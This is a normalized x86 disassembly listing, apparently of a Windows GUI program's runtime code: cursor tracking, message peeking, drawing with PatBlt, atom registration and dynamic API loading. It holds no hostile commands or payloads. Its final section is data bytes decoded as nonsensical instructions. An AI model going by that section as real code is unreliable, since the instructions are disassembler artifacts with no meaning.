mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_455d98
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_455e04
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_455e04
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_424244
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_457e50
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_457e50
pop ecx
mov eax ebx
call sub_4561cc
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4561cc
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_457e50
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_4561cc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42945c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_457ee0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4561cc
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_455d50
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_4561cc
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_457e50
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_457f30
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_44cfd4
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44cfd4
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_457fac
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_455c5c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_455d08
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_4562b0
test eax eax
je r-xdata
mov eax esi
call sub_455cd4
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_457d54
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_456580
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_4562b0
mov edx [ ebx + 0x20 ]
call sub_456208
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_457fac
pop ecx
sub_45802c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_455cb8
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_455cb8
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_4562b0
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_45802c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_457d54
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_456580
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_455eb4
mov eax edi
call sub_4562a4
test eax eax
je r-xdata
mov eax edi
call sub_4562b0
mov esi eax
mov eax esi
call sub_4561cc
push eax
mov eax esi
call sub_455d08
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_4562a4
call sub_4561cc
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_4561cc
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_4561f4
mov eax esi
call sub_4561cc
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_4561f4
mov eax edi
call sub_4562b0
call sub_456244
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_455d08
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_4561f4
mov eax edi
call sub_4562a4
call sub_456244
mov bl 0x1
jmp r-xdata
sub_458164
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_456518
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_416c28
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_456d0c
test eax eax
je r-xdata
push ebp
call sub_457fac
pop ecx
push ebp
call sub_45802c
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_457f30
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_4581ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_455d98
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_455d98
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_457ee0
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_457ee0
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_45827c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_458654
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406a9c
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_456d0c
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_457cb0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406a9c
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_456d0c
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44d178
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45865b
lea eax [ ebp - 0x48 ]
call sub_403eec
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_453e1c
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_44be94
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_44e334
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403eec
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_458164
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_45294c
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_457d64
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406a9c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_4581ec
pop ecx
mov eax [ ebp - 0x4 ]
call sub_457d64
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406a9c
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_456d0c
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_44d554
jmp r-xdata
mov eax edi
call sub_46a4c4
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_456d0c
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44cfd4
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_44d634
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403f40
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_457c50
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46bbc4
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_453e1c
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_44dcdc
jmp r-xdata
sub_458664
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403144
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_4587d8
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_4586f4
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4587b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_458758
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_458788
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406b90
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_4587b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_458724
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_4587d8
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_45873c
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_458758
pop ebx
retn
mov eax ebx
call sub_458788
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_45883c
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4589a2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_458ac0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_458aa4
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_458aa4
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_458bb0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403174
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403174
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403174
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403174
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403eec
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403eec
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_458c38
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_458db0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408c7c
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403f40
mov eax [ rw-data ]
call sub_4043ac
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408c7c
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403f40
mov eax [ rw-data ]
call sub_4043ac
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_4043ac
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4187e0
mov [ rw-data ] eax
call sub_45883c
mov dl 0x1
mov eax [ r-xdata ]
call sub_458664
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b4a0
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46c584
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_46e16c
mov ecx r-xdata
mov edx sub_44a744
mov eax [ r-xdata ]
call sub_417a68
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458db7
lea eax [ ebp - 0x10 ]
call sub_403eec
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_458e20
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_458e7f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458e86
retn
mov eax rw-data
call sub_40cfec
call sub_458bb0
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404968
mov eax rw-data
call sub_403eec
mov eax rw-data
call sub_403eec
sub_458e88
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_458f0e
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458f15
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_458c38
mov eax [ r-xdata ]
call sub_4178dc
mov eax [ r-xdata ]
call sub_41797c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417928
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417928
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417928
sub_45915c
stc
push ebx
push eax
dec [ eax ]
cdq
inc ebp
add [ eax - 0x67 ] dl
inc ebp
add [ ebx + ebx * 4 + 0x45 ] dl
add [ ebx + ebx * 4 + 0x45 ] dh
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
inc eax
add [ ebx + esi + 0x310c0040 ] ch
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
cmp al 0x90
inc ebp
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
test [ ecx + 0x80045 ] dl
or [ ecx + 0x63 ] al
je r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
mov eax 0x54004598
mov [ ecx ] es
inc eax
or eax 0x8b700042
mov eax 0xac004033
xor eax [ eax ]
or al 0x31
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
xchg esp eax
inc ebp
add [ eax ] dh
add [ eax ] al
add [ eax + 0x33a40041 ] bh
inc eax
add [ eax - 0x4bffbfcd ] dh
xor eax [ eax ]
mov eax 0xac004033
arpl [ ebp + 0x74 ] si
nop
push ebp
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
inc ebp
js r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0900
dec esp
imul esi [ ebx + 0x74 ] 0xa5980006
inc ebp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
inc ecx
add [ eax ] bl
push cs
add [ eax - 0x75 ] dh
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
dec esp
push 0x41
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x91fc0000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 4 + 0x45 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 4 ] dh
